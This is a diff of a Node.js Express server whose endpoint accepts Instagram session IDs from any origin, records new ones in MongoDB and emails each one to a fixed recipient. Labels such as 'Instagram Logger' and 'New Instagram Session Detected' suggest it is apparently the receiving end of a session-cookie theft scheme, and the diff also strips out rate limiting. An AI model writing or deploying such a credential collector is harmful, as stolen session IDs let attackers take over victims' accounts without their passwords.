@@ -2,43 +2,33 @@ require("dotenv").config();
 const express = require("express");
 const mongoose = require("mongoose");
 const nodemailer = require("nodemailer");
-const cors = require("cors");
-const rateLimit = require("express-rate-limit");
 const dotenv = require("dotenv");
 dotenv.config({ path: "./.env" });
+const cors = require("cors");
 
 const app = express();
 
-// Middleware
+// Middleware to force JSON responses
 app.use(cors());
 app.use(express.json());
-
-// Rate limiting (5 requests per minute)
-const limiter = rateLimit({
-  windowMs: 60 * 1000,
-  max: 5,
-  message: "Too many requests",
+app.use((req, res, next) => {
+  res.setHeader("Content-Type", "application/json");
+  next();
 });
-app.use("/api/sessions", limiter);
 
 // MongoDB Connection
-mongoose.connect(process.env.MONGODB_URI, {
-  useNewUrlParser: true,
-  useUnifiedTopology: true,
-});
+mongoose
+  .connect(process.env.MONGODB_URI, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+  })
+  .then(() => console.log("MongoDB connected"))
+  .catch((err) => console.error("MongoDB connection error:", err));
 
-// Session Model with TTL (auto-delete after 1 hour)
+// Session Model
 const sessionSchema = new mongoose.Schema({
-  sessionId: {
-    type: String,
-    required: true,
-    unique: true,
-  },
-  createdAt: {
-    type: Date,
-    default: Date.now,
-    expires: 3600, // 1 hour in seconds
-  },
+  sessionId: { type: String, unique: true },
+  createdAt: { type: Date, expires: "1h", default: Date.now },
 });
 const Session = mongoose.model("Session", sessionSchema);
 
@@ -51,57 +41,63 @@ const transporter = nodemailer.createTransport({
   },
 });
 
+// Error Handler Middleware
+app.use((err, req, res, next) => {
+  console.error(err.stack);
+  res.status(500).json({ error: "Internal Server Error" });
+});
+
 // API Endpoint
 app.post("/api/sessions", async (req, res) => {
-  const { sessionId } = req.body;
-
-  if (!sessionId) {
-    return res.status(400).json({ error: "Session ID required" });
-  }
-
   try {
-    // Atomic operation: Insert if doesn't exist
-    const newSession = await Session.findOneAndUpdate(
-      { sessionId },
-      { $setOnInsert: { sessionId } },
-      {
-        upsert: true,
-        new: false, // Return the document before update
-      }
-    );
+    const { sessionId } = req.body;
 
-    // If document already existed
-    if (newSession === null) {
-      return res.status(200).json({
-        sent: false,
-        message: "Duplicate session - already exists in database",
+    if (!sessionId) {
+      return res.status(400).json({
+        success: false,
+        error: "Session ID is required",
       });
     }
 
-    // Send email for new sessions only
+    // Atomic operation to prevent duplicates
+    const existingSession = await Session.findOneAndUpdate(
+      { sessionId },
+      { $setOnInsert: { sessionId } },
+      { upsert: true, new: false }
+    );
+
+    if (existingSession) {
+      return res.status(200).json({
+        success: true,
+        isNew: false,
+        message: "Session already exists",
+      });
+    }
+
+    // Send email for new sessions
     await transporter.sendMail({
-      from: `Instagram Logger <${process.env.EMAIL_USER}>`,
       to: process.env.RECIPIENT_EMAIL,
-      subject: "New Instagram Session Detected",
+      subject: "New Instagram Session",
       text: `Session ID: ${sessionId}`,
-      html: `<p>New session detected: <code>${sessionId}</code></p>`,
     });
 
     res.status(200).json({
-      sent: true,
-      message: "New session recorded and notification sent",
+      success: true,
+      isNew: true,
+      message: "New session recorded",
     });
   } catch (error) {
-    console.error("Error:", error);
-    res.status(500).json({ error: "Internal server error" });
+    console.error("Endpoint error:", error);
+    res.status(500).json({
+      success: false,
+      error: "Internal server error",
+    });
   }
 });
 
 app.get("/", (req, res) => {
-  res.sendFile(" Hello World.html");
+  res.send("Hello World!");
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
